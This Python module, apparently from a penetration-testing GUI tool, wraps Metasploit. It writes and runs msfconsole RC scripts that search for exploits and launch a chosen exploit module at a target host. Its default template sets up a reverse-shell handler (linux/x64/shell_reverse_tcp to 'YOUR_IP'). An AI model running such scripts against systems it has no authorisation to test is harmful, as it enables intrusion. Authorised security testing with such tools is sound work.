"""
Metasploit module - search exploits by CVE/keyword and generate RC scripts
"""
import threading
import os
from datetime import datetime
from .base_module import BaseModule


class MetasploitModule(BaseModule):
    def search_exploits(self, query: str, options: dict):
        """Run msfconsole with a search command"""
        search_type = options.get("search_type", "keyword")

        if search_type == "cve":
            search_query = f"cve:{query}"
        elif search_type == "platform":
            search_query = f"platform:{query}"
        elif search_type == "type":
            search_query = f"type:{options.get('module_type','exploit')} {query}"
        else:
            search_query = query

        rc_content = f"""search {search_query}
exit
"""
        rc_file = self._write_rc(rc_content, "search")
        cmd = ["msfconsole", "-q", "-r", rc_file]
        t = threading.Thread(target=self.run_command, args=(cmd, query), daemon=True)
        t.start()

    def run_exploit(self, target: str, options: dict):
        """Generate and run an RC script for a specific exploit"""
        module = options.get("module", "")
        lhost = options.get("lhost", "")
        lport = options.get("lport", "4444")
        payload = options.get("payload", "")
        extra_opts = options.get("extra_opts", "")

        if not module:
            self.output_callback("  ERROR  Especifica un módulo de exploit\n", "error")
            return

        rc_lines = [
            f"use {module}",
            f"set RHOSTS {target}",
        ]

        if lhost:
            rc_lines.append(f"set LHOST {lhost}")
        if lport:
            rc_lines.append(f"set LPORT {lport}")
        if payload:
            rc_lines.append(f"set PAYLOAD {payload}")

        # Extra options (key=value pairs, one per line)
        if extra_opts:
            for opt in extra_opts.strip().split("\n"):
                if "=" in opt:
                    rc_lines.append(f"set {opt.strip()}")

        rc_lines.extend(["show options", "run", "exit"])

        rc_content = "\n".join(rc_lines) + "\n"
        rc_file = self._write_rc(rc_content, "exploit")

        self.output_callback(f"\n  RC SCRIPT\n{rc_content}\n", "info")

        cmd = ["msfconsole", "-q", "-r", rc_file]
        t = threading.Thread(target=self.run_command, args=(cmd, target), daemon=True)
        t.start()

    def generate_rc_only(self, target: str, options: dict) -> str:
        """Generate RC script without running it"""
        module = options.get("module", "exploit/multi/handler")
        lhost = options.get("lhost", "YOUR_IP")
        lport = options.get("lport", "4444")
        payload = options.get("payload", "linux/x64/shell_reverse_tcp")

        rc_content = f"""# Metasploit RC Script
# Target: {target}
# Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

use {module}
set RHOSTS {target}
set LHOST {lhost}
set LPORT {lport}
set PAYLOAD {payload}
show options
run
"""
        os.makedirs("scripts", exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"scripts/msf_{ts}.rc"
        with open(filename, "w") as f:
            f.write(rc_content)
        return filename, rc_content

    def _write_rc(self, content: str, prefix: str) -> str:
        os.makedirs("/tmp/pentool_rc", exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = f"/tmp/pentool_rc/{prefix}_{ts}.rc"
        with open(path, "w") as f:
            f.write(content)
        return path
